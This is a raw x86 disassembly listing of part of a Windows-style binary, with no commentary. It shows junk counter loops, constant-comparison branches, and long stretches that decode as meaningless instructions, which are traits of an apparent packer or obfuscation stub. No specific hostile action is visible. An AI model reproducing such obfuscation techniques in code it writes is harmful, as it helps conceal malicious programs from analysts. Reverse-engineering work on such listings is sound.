  407b55:	add    DWORD PTR ds:0x433687,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4337af,0x43368f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43371f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433683
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433727,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43369f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4336eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4336eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433757
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4336d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4336d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4336d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4336d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4336d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4336d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4336d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4336d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	shr    DWORD PTR [ebp-0x33d46c66],0x7e
  407c51:	jle    0x407c58
  407c53:	jl     0x407cd3
  407c55:	jle    0x407bd8
  407c57:	in     al,0xa6
  407c59:	xor    esi,DWORD PTR [eax]
  407c5b:	stos   BYTE PTR es:[edi],al
  407c5c:	mov    eax,ds:0x673f2113
  407c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c62:	fcom   DWORD PTR [ecx+edi*4-0x5eac6c9d]
  407c69:	hlt    
  407c6a:	daa    
  407c6b:	dec    ebp
  407c6c:	mov    DWORD PTR [ebx-0x1c],ecx
  407c6f:	xchg   esi,eax
  407c70:	sub    DWORD PTR [ebx+0xde9c0e9],esi
  407c76:	pop    eax
  407c77:	dec    edi
  407c78:	in     al,dx
  407c79:	rcl    ecx,0x18
  407c7c:	or     al,0xf2
  407c7e:	pop    esp
  407c7f:	stos   BYTE PTR es:[edi],al
  407c80:	sar    DWORD PTR [edx+0x2a],0x8c
  407c84:	mov    esi,0x540b9dfe
  407c89:	jg     0x407c63
  407c8b:	jmp    0xc1d8b900
  407c90:	out    dx,al
  407c91:	sub    ebx,DWORD PTR [eax]
  407c93:	xchg   BYTE PTR [ecx+0x5],bh
  407c96:	adc    al,0x90
  407c98:	push   ebp
  407c99:	enter  0xda,0x8e
  407c9d:	and    eax,0x1d48c588
  407ca2:	mov    dl,BYTE PTR [eax+edi*1-0x3e]
  407ca6:	mov    ebp,0xc920af05
  407cab:	inc    esp
  407cac:	adc    al,0x7a
  407cae:	mov    ch,0x44
  407cb0:	inc    esp
  407cb1:	out    0xdc,eax
  407cb3:	inc    ebp
  407cb4:	sbb    eax,0x28d4966f
  407cb9:	mov    dl,0xfb
  407cbb:	iret   
  407cbc:	sahf   
  407cbd:	push   0x8ea93adb
  407cc2:	retf   0x2ae1
  407cc5:	cmp    al,0x1f
  407cc7:	and    eax,0xfe0919be
  407ccc:	inc    eax
  407ccd:	and    BYTE PTR [eax-0xd7e6729],dl
  407cd3:	jbe    0x407d0a
  407cd5:	je     0x407c6d
  407cd7:	jge    0x407ce8
  407cd9:	nop
  407cda:	sbb    al,0x42
  407cdc:	inc    edi
  407cdd:	scas   al,BYTE PTR es:[edi]
  407cde:	mov    ebx,0x8506500b
  407ce3:	and    al,0xec
  407ce5:	xor    BYTE PTR [eax-0x2135ac18],bh
  407ceb:	mov    al,ds:0x9897c120
  407cf0:	mov    ebx,0xa63eb14b
  407cf5:	dec    ebp
  407cf6:	sbb    DWORD PTR [edx-0x75],ebp
  407cf9:	sub    DWORD PTR [esi],0xa95c74f6
  407cff:	jp     0x407d11
  407d01:	inc    edx
  407d02:	jmp    0x407d6d
  407d04:	into   
  407d05:	adc    bl,BYTE PTR [eax+0x7bacf20a]
  407d0b:	sbb    BYTE PTR [edx],0xf1
  407d0e:	mov    edi,0xb4126188
  407d13:	test   DWORD PTR [ebp+0x5c],0x3cea1830
  407d1a:	stc    
  407d1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d1c:	mov    ecx,0xb42be822
  407d21:	xor    al,0x37
  407d23:	jl     0x407d40
  407d25:	xor    DWORD PTR [ecx+0x2a2bd793],0xffffff8e
  407d2c:	in     al,0xa6
  407d2e:	(bad)  
  407d2f:	aam    0x2e
  407d31:	sti    
  407d32:	bound  ecx,QWORD PTR [ebp+0x21]
  407d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d36:	mov    esi,0x7c55c85a
  407d3b:	hlt    
  407d3c:	cmp    al,0x5
  407d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d40:	jo     0x407db3
  407d42:	dec    eax
  407d43:	mov    esp,0x31103385
  407d48:	xor    dl,ah
  407d4a:	or     edx,ebp
  407d4c:	fwait
  407d4d:	jne    0x407db5
  407d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d50:	mov    ds:0x2e9f85f2,eax
  407d55:	ftst   
  407d57:	xor    eax,0x34724b21
  407d5c:	mov    al,ds:0x218b19e8
  407d61:	mov    ebx,DWORD PTR [edi+0xf5194b0]
  407d67:	dec    ecx
  407d68:	and    bh,BYTE PTR [edi-0x538d7cf3]
  407d6e:	dec    ecx
  407d6f:	push   ebp
  407d70:	jno    0x407cfb
  407d72:	imul   edx,DWORD PTR [ebx],0x1a410ae4
  407d78:	lahf   
  407d79:	jae    0x407d3c
  407d7b:	cmp    edi,eax
  407d7d:	xchg   ebp,eax
  407d7e:	sub    DWORD PTR [esi+0x5a3fbf2],edx
  407d84:	mov    fs,WORD PTR [ecx-0x1a]
  407d87:	mov    bl,0x29
  407d89:	jb     0x407df7
  407d8b:	sar    BYTE PTR [eax+0x66d7ddea],1
  407d91:	push   0x96f9f96e
  407d96:	dec    ecx
  407d97:	add    eax,0xda5f406b
  407d9c:	or     al,0xfa
  407d9e:	or     cl,BYTE PTR [edi+0x52]
  407da1:	cmp    BYTE PTR [eax],dl
  407da3:	and    esi,DWORD PTR [eax]
  407da5:	mov    al,ds:0xfc0ae2d4
  407daa:	and    DWORD PTR [esi],ebx
  407dac:	loop   0x407d31
  407dae:	mov    cl,0xd9
  407db0:	inc    ecx
  407db1:	outs   dx,BYTE PTR ss:[esi]
  407db3:	xchg   ebp,eax
  407db4:	in     eax,dx
  407db5:	loop   0x407da4
  407db7:	mov    dh,0x5a
  407db9:	xor    al,0xc3
  407dbb:	ja     0x407d68
  407dbd:	fs xor cl,al
  407dc0:	imul   ebp,esi,0x7b9ee04a
  407dc6:	mov    esp,0xaca41c8b
  407dcb:	in     al,dx
  407dcc:	sar    DWORD PTR ds:0x75dd56c1,1
  407dd2:	adc    dh,BYTE PTR ss:[esi-0x4c]
  407dd6:	xchg   ebx,eax
  407dd7:	xor    eax,0x102a466c
  407ddc:	and    BYTE PTR [ecx-0x55],0xef
  407de0:	sbb    DWORD PTR [eax+0xbc63bc7],edx
  407de6:	loopne 0x407e5e
  407de8:	push   edx
  407de9:	test   BYTE PTR [edi-0x22],0x1a
  407ded:	call   0x5380:0x84c30516
  407df4:	cs scas eax,DWORD PTR es:[edi]
  407df6:	pop    ss
  407df7:	stc    
  407df8:	dec    edx
  407df9:	pop    eax
  407dfa:	test   BYTE PTR [edi-0x1b],0xaa
  407dfe:	rcl    BYTE PTR [ebx-0x1c398425],1
  407e04:	and    al,0xf3
  407e06:	sub    DWORD PTR [ebp+eiz*8+0x3e67b738],esi
  407e0d:	inc    BYTE PTR [esi-0x12ee65e5]
  407e13:	aam    0x72
  407e15:	dec    eax
  407e16:	sti    
  407e17:	and    esp,DWORD PTR [edx-0x5f]
  407e1a:	xchg   ax,ax
  407e1c:	fs dec esp
  407e1e:	faddp  st(5),st
  407e20:	jmp    FWORD PTR [edi-0x73]
  407e23:	stc    
  407e24:	mov    eax,ds:0x4374236a
  407e29:	inc    ebx
  407e2a:	xchg   ebx,eax
  407e2b:	lahf   
  407e2c:	mov    ebx,0xa42fbf61
  407e31:	lods   eax,DWORD PTR ds:[esi]
  407e32:	fs inc ebx
  407e34:	add    dl,BYTE PTR [edi+0x309a01ac]
  407e3a:	out    0x76,al
  407e3c:	sub    eax,0x2e4fe3e0
  407e41:	leave  
  407e42:	or     DWORD PTR [ecx+0x23e04d95],esp
  407e48:	jp     0x407e7e
  407e4a:	mov    ds:0x9bb79a04,al
  407e4f:	inc    esp
  407e50:	mov    ah,0x70
  407e52:	mov    es,WORD PTR [ebx-0x40]
  407e55:	mov    al,ds:0xae0d25ff
  407e5a:	daa    
  407e5b:	xchg   ebp,eax
  407e5c:	ja     0x407e49
  407e5e:	xchg   BYTE PTR [ebp-0x74ef76ce],bh
  407e64:	inc    ebp
  407e65:	hlt    
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4336eb
  407f81:	or     DWORD PTR ds:0x4336ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433757,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433753,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43379b
  407fad:	sub    DWORD PTR ds:0x433727,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4336db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43372b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43372b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43372b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43372b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43372b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433967
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43372b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43372b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43372b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43372b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43372b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43372b,ebx
  408048:	cmp    DWORD PTR ds:0x43372b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43372b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43372b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43372b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43372b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43367b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43375b
  4080b1:	and    DWORD PTR ds:0x433763,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43371b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4337a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4337a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4337a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4337a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43375b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4337a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4337a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4337a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4337a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433797,0x1f
  40813b:	cmp    DWORD PTR ds:0x433797,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433797,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433797
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433797,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x99746e0d
  408191:	iret   
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	push   ebp
  40819b:	jle    0x408132
  40819d:	push   0x8
  40819f:	into   
  4081a0:	repnz push ss
  4081a2:	inc    esp
  4081a3:	imul   ebx,DWORD PTR [eax-0x36],0x47c56ab9
  4081aa:	in     eax,dx
  4081ab:	lods   al,BYTE PTR ds:[esi]
  4081ac:	inc    edi
  4081ad:	inc    esp
  4081ae:	xor    cl,BYTE PTR [ecx]
  4081b0:	fsubr  QWORD PTR [ecx-0x34]
  4081b3:	fwait
  4081b4:	ret    
  4081b5:	popa   
  4081b6:	ds cld 
  4081b8:	daa    
  4081b9:	pushf  
  4081ba:	retf   
  4081bb:	outs   dx,DWORD PTR ds:[esi]
  4081bc:	scas   al,BYTE PTR es:[edi]
  4081bd:	pop    esi
  4081be:	push   0xffffffe9
  4081c0:	shl    DWORD PTR [esi],1
  4081c2:	jg     0x408208
  4081c4:	cmp    al,BYTE PTR [ebx+esi*1+0x22]
  4081c8:	jmp    0xdb0f:0xbfb81b96
  4081cf:	sbb    ch,ch
  4081d1:	shl    bh,1
  4081d3:	sar    DWORD PTR [edx],1
  4081d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081d6:	jns    0x40820b
  4081d8:	adc    bl,ah
  4081da:	shr    DWORD PTR [ebp+0x7aba53c4],1
  4081e0:	pop    edx
  4081e1:	daa    
  4081e2:	add    al,0xb4
  4081e4:	adc    al,0x3
  4081e6:	inc    esi
  4081e7:	sti    
  4081e8:	mov    esi,0xb4ae184f
  4081ed:	xor    dh,al
  4081ef:	pop    esi
  4081f0:	and    dl,BYTE PTR [ecx+edi*1]
  4081f3:	stc    
  4081f4:	fst    DWORD PTR [eax*1+0xc51a87a]
  4081fb:	pop    ebp
  4081fc:	mov    esi,0x65c96351
  408201:	ins    BYTE PTR es:[edi],dx
  408202:	mov    ecx,0xa2a99914
  408207:	mov    bl,0x18
  408209:	ret    0x2500
  40820c:	(bad)  
  40820d:	in     al,0x62
  40820f:	jns    0x408273
  408211:	in     eax,0x10
  408213:	out    dx,eax
  408214:	pushf  
  408215:	fdivr  st,st(3)
  408217:	add    edi,DWORD PTR ds:0x7579250
  40821d:	mov    edi,0xb9ec584
  408222:	xlat   BYTE PTR gs:[ebx]
  408224:	(bad)  
  408225:	rcl    BYTE PTR [ebx-0x6a],cl
  408228:	mov    BYTE PTR [eax+ebx*2-0x5d6af695],al
  40822f:	pop    ss
  408230:	jmp    0x40825f
  408232:	pop    es
  408233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408234:	mov    al,0x3c
  408236:	fcom   QWORD PTR ds:0xcd4affea
  40823c:	(bad)  
  40823d:	les    eax,FWORD PTR [ebp+0x9]
  408240:	push   ecx
  408241:	dec    ecx
  408242:	icebp  
  408243:	ins    DWORD PTR es:[edi],dx
  408244:	daa    
  408245:	mov    eax,ecx
  408247:	fiadd  WORD PTR [ebx+0x1a951281]
  40824d:	aad    0xbc
  40824f:	pushf  
  408250:	rol    BYTE PTR [ebx-0x6380a4b4],cl
  408256:	pop    esi
  408257:	ret    
  408258:	and    al,bl
  40825a:	pop    ebx
  40825b:	inc    esi
  40825c:	inc    esp
  40825d:	cmp    ecx,DWORD PTR [ebx-0x1ee68e43]
  408263:	fstp   st(5)
  408265:	xor    al,0x1d
  408267:	xlat   BYTE PTR ds:[ebx]
  408268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408269:	or     esi,DWORD PTR [eax+0x3b]
  40826c:	jbe    0x408216
  40826e:	push   ds
  40826f:	lods   eax,DWORD PTR ds:[esi]
  408270:	pop    ss
  408271:	arpl   sp,bp
  408273:	cmp    ebp,DWORD PTR [esi-0x77]
  408276:	fsub   st(5),st
  408278:	jp     0x408255
  40827a:	loope  0x4082ab
  40827c:	fadd   DWORD PTR [eax]
  40827e:	ret    
  40827f:	mov    ?,WORD PTR [ecx]
  408281:	cmp    dl,BYTE PTR [esp+ebx*1+0x3df8fc99]
  408288:	xor    DWORD PTR [edx+0x3],0xa8d28cf7
  40828f:	repnz xor al,0x38
  408292:	or     al,0xc4
  408294:	dec    ebp
  408295:	adc    al,0xba
  408297:	jae    0x40827f
  408299:	dec    eax
  40829a:	call   0xfa5b05ca
  40829f:	pop    ds
  4082a0:	rol    dh,cl
  4082a2:	sub    BYTE PTR [esi-0x73796ccb],0xd8
  4082a9:	mov    ds:0x70dd64eb,eax
  4082ae:	and    edi,DWORD PTR [eax+0x1f]
  4082b1:	adc    BYTE PTR [ebx],bl
  4082b3:	jle    0x408293
  4082b5:	bound  edi,QWORD PTR fs:0x38da833c
  4082bc:	shl    cl,cl
  4082be:	cmp    al,0x53
  4082c0:	dec    ebx
  4082c1:	(bad)  
  4082c2:	dec    ebp
  4082c3:	in     eax,0x11
  4082c5:	mov    edi,0x1d772bf
  4082ca:	jle    0x408291
  4082cc:	sub    eax,0x8d4581fe
  4082d1:	inc    ebp
  4082d2:	xchg   ebp,eax
  4082d3:	mov    al,0x42
  4082d5:	loope  0x40825f
  4082d7:	aaa    
  4082d8:	mov    ah,0xbe
  4082da:	jmp    0x40825d
  4082dc:	js     0x4082d8
  4082de:	cli    
  4082df:	in     eax,0x5a
  4082e1:	retf   
  4082e2:	mov    edx,0x168ae73a
  4082e7:	call   0xacb582d7
  4082ec:	aad    0x6b
  4082ee:	ins    BYTE PTR es:[edi],dx
  4082ef:	sub    eax,0x264382b4
  4082f4:	mov    bl,0xe6
  4082f6:	push   eax
  4082f7:	xchg   BYTE PTR [ecx],bl
  4082f9:	push   ecx
  4082fa:	pop    ecx
  4082fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082fc:	(bad)  
  4082fe:	sub    BYTE PTR [edx+0x44],dl
  408301:	in     al,0xc2
  408303:	pop    esi
  408304:	push   esi
  408305:	dec    eax
  408306:	lods   eax,DWORD PTR ds:[esi]
  408307:	mov    BYTE PTR [esi],ah
  408309:	jns    0x408363
  40830b:	adc    DWORD PTR [ebp+0x38],edx
  40830e:	in     eax,dx
  40830f:	cwde   
  408310:	js     0x4082b7
  408312:	scas   al,BYTE PTR es:[edi]
  408313:	and    BYTE PTR [ecx+0x4f584380],bl
  408319:	test   BYTE PTR [ebp-0x38185804],ah
  40831f:	das    
  408320:	mov    esp,0xf4c05b99
  408325:	jbe    0x4082ef
  408327:	jmp    0x40837c
  408329:	inc    edi
  40832a:	and    dl,al
  40832c:	add    ch,al
  40832e:	adc    dl,BYTE PTR [ebx+0x1]
  408331:	inc    esi
  408332:	mov    edx,0xdc94aabc
  408337:	enter  0x8829,0x2b
  40833b:	pop    ds
  40833c:	mov    bh,0xe4
  40833e:	or     BYTE PTR [edi-0x2b],cl
  408341:	mov    ebp,0xf262adf6
  408346:	lds    eax,FWORD PTR [edi+0x29]
  408349:	mov    dl,0x24
  40834b:	mov    eax,ds:0xf666dc72
  408350:	xchg   ecx,eax
  408351:	sub    al,0x19
  408353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408354:	inc    ecx
  408355:	sbb    BYTE PTR [esi+0x42],ch
  408358:	mov    BYTE PTR [ebp-0x1e],0x8b
  40835c:	test   al,0xff
  40835e:	dec    eax
  40835f:	mov    dh,BYTE PTR [ebp-0x4d91165c]
  408365:	mov    esi,0xf57acbc0
  40836a:	jb     0x40834e
  40836c:	pop    ebp
  40836d:	inc    edi
  40836e:	cmp    DWORD PTR [ebp+0x4],esp
  408371:	test   DWORD PTR [esi+edx*8],0xf8a31d21
  408378:	outs   dx,BYTE PTR ds:[esi]
  408379:	fimul  WORD PTR [ebx-0x18e2bf59]
  40837f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408380:	jl     0x4083eb
  408382:	push   eax
  408383:	test   al,0xef
  408385:	mov    ah,0xef
  408387:	mov    eax,0xc194702d
  40838c:	push   esp
  40838d:	mov    esi,0xeccf1218
  408392:	outs   dx,BYTE PTR ds:[esi]
  408393:	hlt    
  408394:	fadd   st,st(2)
  408396:	retf   
  408397:	imul   BYTE PTR [ebx+0xa22249b]
  40839d:	dec    ebx
  40839e:	jo     0x408378
  4083a0:	dec    ebp
  4083a1:	jl     0x408363
  4083a3:	push   ecx
  4083a4:	dec    ebx
  4083a5:	add    BYTE PTR ds:0x8d1c57c2,dl
  4083ab:	fidiv  WORD PTR [ebx+0x47]
  4083ae:	bound  ebx,QWORD PTR [ecx+0x607a213c]
  4083b4:	mov    ds:0x743ac833,eax
  4083b9:	inc    ecx
  4083ba:	mov    ds:0xfac9dfd1,eax
  4083bf:	(bad)  
  4083c1:	dec    edx
  4083c2:	xor    al,0xdb
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x4336db,0x0
  4083d1:	mov    eax,ds:0x4336db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4336db,eax
  4083dc:	cmp    DWORD PTR ds:0x4336db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4336db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4336db
  40840c:	inc    eax
  40840d:	mov    ds:0x4336db,eax
  408412:	cmp    DWORD PTR ds:0x4336db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43368b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433693,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4337a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	inc    edx
  408465:	add    cl,ah
  408467:	ins    DWORD PTR es:[edi],dx
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	out    dx,eax
  408471:	aas    
  408472:	daa    
  408473:	pop    esi
  408474:	call   0x3645:0x9d4d516b
  40847b:	retf   0x4556
  40847e:	mov    al,ds:0xe839c57d
  408483:	inc    eax
  408484:	mov    BYTE PTR [edx],0x48
  408487:	pop    DWORD PTR [ebp+eiz*8+0x7e]
  40848b:	loop   0x408422
  40848d:	pusha  
  40848e:	adc    edi,ecx
  408490:	rol    DWORD PTR [ebx-0x3d],cl
  408493:	and    eax,0x9f482964
  408498:	mov    ebp,0x61722a89
  40849d:	cmc    
  40849e:	or     bl,dl
  4084a0:	push   ebp
  4084a1:	mov    WORD PTR [eax-0x3dc6792c],gs
  4084a7:	shl    edi,0xbb
  4084aa:	call   0x26b:0x27b89636
  4084b1:	scas   eax,DWORD PTR es:[edi]
  4084b2:	inc    edi
  4084b3:	pop    esi
  4084b4:	es test edi,ebp
  4084b7:	add    esp,DWORD PTR [ecx+edx*4+0x126b0a53]
  4084be:	adc    al,0xb0
  4084c0:	pop    esp
  4084c1:	pusha  
  4084c2:	push   cs
  4084c3:	adc    eax,0x3d12c14a
  4084c8:	dec    eax
